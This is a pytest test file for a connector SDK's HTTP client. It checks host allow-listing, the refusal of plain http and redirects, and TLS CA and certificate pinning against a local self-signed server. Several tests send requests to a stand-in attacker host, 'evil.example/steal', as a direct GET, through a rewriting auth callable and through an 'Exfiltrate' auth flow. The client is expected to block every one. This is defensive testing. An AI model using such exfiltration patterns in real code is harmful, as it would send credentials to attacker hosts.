"""The connector HTTP client: declared hosts only, https only, and the three TLS forms (S32).

The TLS tests run a real TLS server on 127.0.0.1 with a self-signed certificate made by the
`openssl` CLI (ruling R2: no `cryptography` dependency; a runner without openssl FAILS, it does
not skip). The server records the bytes it receives on each connection, so a refused pin can be
shown to have refused BEFORE a single request byte was sent (Review Focus 3).
"""

import hashlib
import shutil
import socketserver
import ssl
import subprocess
import threading
import time

import httpx
import pytest
from auspex_sdk.http import (
    CertificatePinMismatch,
    ConnectorHttp,
    HostNotDeclared,
    PlainHttpRefused,
    resolve_hosts,
)
from auspex_sdk.manifest import Tls

# --- the local TLS server ------------------------------------------------------------------


def make_cert(directory, *, san: bool = True):
    """A self-signed EC certificate for CN=localhost (SAN DNS:localhost unless san=False)."""
    openssl = shutil.which("openssl")
    if openssl is None:
        pytest.fail("the TLS tests need the openssl CLI (ruling R2): install openssl")
    key, cert = directory / "key.pem", directory / "cert.pem"
    argv = [
        openssl,
        "req",
        "-x509",
        "-newkey",
        "ec",
        "-pkeyopt",
        "ec_paramgen_curve:prime256v1",
        "-nodes",
        "-keyout",
        str(key),
        "-out",
        str(cert),
        "-days",
        "2",
        "-subj",
        "/CN=localhost",
    ]
    if san:
        argv += ["-addext", "subjectAltName=DNS:localhost"]
    subprocess.run(argv, check=True, capture_output=True)  # noqa: S603 -- our argv, no input
    return key, cert


@pytest.fixture(scope="session")
def self_signed(tmp_path_factory):
    """(cert_pem, key_path, cert_path, leaf DER sha256) for CN/SAN `localhost` only."""
    key, cert = make_cert(tmp_path_factory.mktemp("tls"))
    pem = cert.read_text()
    der = ssl.PEM_cert_to_DER_cert(pem)
    return pem, key, cert, hashlib.sha256(der).hexdigest()


class _Server(socketserver.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True


@pytest.fixture
def tls_server(self_signed):
    """A TLS server on 127.0.0.1; `.log` holds (outcome, bytes received) per connection."""
    _, key, cert, _ = self_signed
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert, key)
    log: list[tuple[str, bytes]] = []

    class Handler(socketserver.BaseRequestHandler):
        def handle(self):
            try:
                conn = ctx.wrap_socket(self.request, server_side=True)
            except (ssl.SSLError, OSError):
                log.append(("handshake_failed", b""))
                return
            conn.settimeout(5)
            data = b""
            try:
                while b"\r\n\r\n" not in data:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except (ssl.SSLError, OSError):
                pass
            log.append(("connected", data))
            if data:
                body = b'{"ok":true}'
                conn.sendall(
                    b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
                    + f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode()
                    + body
                )
            conn.close()

    server = _Server(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    server.log = log
    try:
        yield server
    finally:
        server.shutdown()
        server.server_close()


def wait_for_log(server, n: int = 1) -> list[tuple[str, bytes]]:
    deadline = time.monotonic() + 5
    while len(server.log) < n and time.monotonic() < deadline:
        time.sleep(0.01)
    return list(server.log)


def client_for(server, tls: Tls) -> tuple[ConnectorHttp, int]:
    port = server.server_address[1]
    hosts = [f"https://localhost:{port}", f"https://127.0.0.1:{port}"]
    return ConnectorHttp(hosts, tls), port


# --- hosts and schemes (no network: a mock transport records what reaches it) ---------------


def recording_transport() -> tuple[httpx.MockTransport, list[httpx.Request]]:
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, json={"ok": True})

    return httpx.MockTransport(handler), seen


def test_an_undeclared_host_is_refused_before_anything_is_sent():
    transport, seen = recording_transport()
    http = ConnectorHttp(["https://api.vendor.example"], Tls(), transport=transport)
    with pytest.raises(HostNotDeclared):
        http.get("https://evil.example/steal")
    # userinfo and a look-alike suffix do not change the host httpx would connect to
    with pytest.raises(HostNotDeclared):
        http.get("https://api.vendor.example@evil.example/")
    with pytest.raises(HostNotDeclared):
        http.get("https://api.vendor.example.evil.example/")
    assert seen == []


def test_hosts_compare_case_insensitively_and_by_port():
    transport, seen = recording_transport()
    http = ConnectorHttp(["https://API.Vendor.Example"], Tls(), transport=transport)
    assert http.get("https://api.vendor.example/x").status_code == 200
    assert http.get("https://API.VENDOR.EXAMPLE:443/y").status_code == 200
    with pytest.raises(HostNotDeclared):
        http.get("https://api.vendor.example:8443/z")
    assert len(seen) == 2


def test_plain_http_is_refused_even_to_a_declared_host():
    transport, seen = recording_transport()
    http = ConnectorHttp(["https://api.vendor.example"], Tls(), transport=transport)
    with pytest.raises(PlainHttpRefused):
        http.get("http://api.vendor.example/")
    with pytest.raises(PlainHttpRefused):
        ConnectorHttp(["http://api.vendor.example"], Tls())
    assert seen == []


def test_redirects_are_never_followed_and_cannot_be_turned_on():
    calls: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        return httpx.Response(302, headers={"Location": "https://evil.example/"})

    http = ConnectorHttp(
        ["https://api.vendor.example"], Tls(), transport=httpx.MockTransport(handler)
    )
    r = http.get("https://api.vendor.example/start")
    assert r.status_code == 302
    assert calls == ["https://api.vendor.example/start"]
    with pytest.raises(ValueError, match="follow_redirects"):
        http.get("https://api.vendor.example/", follow_redirects=True)
    # extensions could change the TLS server name (sni_hostname) behind the hostname check
    with pytest.raises(ValueError, match="extensions"):
        http.get("https://api.vendor.example/", extensions={"sni_hostname": "evil.example"})


def test_every_method_goes_through_the_host_check():
    transport, seen = recording_transport()
    http = ConnectorHttp(["https://api.vendor.example"], Tls(), transport=transport)
    for method in ("get", "post", "put", "patch", "delete", "head", "options"):
        with pytest.raises(HostNotDeclared):
            getattr(http, method)("https://evil.example/")
        getattr(http, method)("https://api.vendor.example/")
    assert [r.method for r in seen] == ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]


def test_resolve_hosts_reads_placeholders_from_config():
    hosts = resolve_hosts(
        ["https://{base_url}", "https://api.vendor.example:8443"],
        {"base_url": "https://QRadar.Corp.Example:9443/api"},
    )
    assert hosts == frozenset({("qradar.corp.example", 9443), ("api.vendor.example", 8443)})
    with pytest.raises(PlainHttpRefused):
        resolve_hosts(["https://{base_url}"], {"base_url": "http://qradar.corp.example"})
    with pytest.raises(HostNotDeclared):
        resolve_hosts(["https://{base_url}"], {})


# --- TLS: verify, a pinned CA, a pinned certificate -----------------------------------------


def test_verify_never_accepts_a_self_signed_certificate(tls_server):
    http, port = client_for(tls_server, Tls())
    with pytest.raises(httpx.ConnectError, match="CERTIFICATE_VERIFY_FAILED"):
        http.get(f"https://localhost:{port}/")
    assert all(data == b"" for _, data in wait_for_log(tls_server))


def test_a_pinned_ca_accepts_the_right_hostname(tls_server, self_signed):
    http, port = client_for(tls_server, Tls(ca_pem=self_signed[0]))
    r = http.get(f"https://localhost:{port}/ping")
    assert r.json() == {"ok": True}


def test_a_pinned_ca_still_checks_the_hostname(tls_server, self_signed):
    # the cert names only `localhost`; 127.0.0.1 is declared but is not the cert's name
    http, port = client_for(tls_server, Tls(ca_pem=self_signed[0]))
    with pytest.raises(httpx.ConnectError, match="CERTIFICATE_VERIFY_FAILED"):
        http.get(f"https://127.0.0.1:{port}/")
    assert all(data == b"" for _, data in wait_for_log(tls_server))


def test_a_pinned_ca_that_did_not_issue_the_cert_is_refused(tls_server, tmp_path):
    _, other = make_cert(tmp_path, san=False)
    http, port = client_for(tls_server, Tls(ca_pem=other.read_text()))
    with pytest.raises(httpx.ConnectError, match="CERTIFICATE_VERIFY_FAILED"):
        http.get(f"https://localhost:{port}/")


def test_a_certificate_pin_accepts_whatever_the_hostname(tls_server, self_signed):
    pin = self_signed[3]
    http, port = client_for(tls_server, Tls(cert_sha256=pin))
    assert http.get(f"https://127.0.0.1:{port}/a").json() == {"ok": True}
    assert http.get(f"https://localhost:{port}/b").json() == {"ok": True}
    # an upper-case pin is the same pin
    http2, _ = client_for(tls_server, Tls(cert_sha256=pin.upper()))
    assert http2.get(f"https://127.0.0.1:{port}/c").status_code == 200


def test_a_pin_one_byte_off_fails_closed_before_any_request_byte(tls_server, self_signed):
    # Review Focus 3: flip the last byte of the real digest. The connection must be refused,
    # and the server must have received nothing after the handshake: no request line, no
    # headers (which would carry the connector's credentials).
    digest = bytearray(bytes.fromhex(self_signed[3]))
    digest[-1] ^= 0x01
    http, port = client_for(tls_server, Tls(cert_sha256=digest.hex()))
    with pytest.raises(CertificatePinMismatch):
        http.get(f"https://127.0.0.1:{port}/", headers={"Authorization": "Bearer <REDACTED>"})
    log = wait_for_log(tls_server)
    assert log, "the server saw no connection at all"
    assert all(data == b"" for _, data in log)


def test_a_wrong_pin_is_refused_on_every_new_connection(tls_server):
    http, port = client_for(tls_server, Tls(cert_sha256="00" * 32))
    for _ in range(2):
        with pytest.raises(CertificatePinMismatch):
            http.get(f"https://localhost:{port}/")


# --- every send path passes the host check (fix round 1) -----------------------------------


def test_an_auth_callable_cannot_send_to_an_undeclared_host():
    transport, seen = recording_transport()
    http = ConnectorHttp(["https://api.vendor.example"], Tls(), transport=transport)

    def rewrite(r: httpx.Request) -> httpx.Request:
        return httpx.Request("GET", "https://evil.example/steal", headers=r.headers)

    with pytest.raises(HostNotDeclared):
        http.get("https://api.vendor.example/x", auth=rewrite)
    assert seen == []


def test_an_auth_flow_cannot_send_a_second_request_to_an_undeclared_host():
    class Exfiltrate(httpx.Auth):
        def auth_flow(self, request):
            yield request  # the declared host: allowed
            yield httpx.Request("POST", "https://evil.example/steal", content=b"x")

    transport, seen = recording_transport()
    http = ConnectorHttp(["https://api.vendor.example"], Tls(), transport=transport)
    with pytest.raises(HostNotDeclared):
        http.get("https://api.vendor.example/x", auth=Exfiltrate())
    assert [str(r.url) for r in seen] == ["https://api.vendor.example/x"]
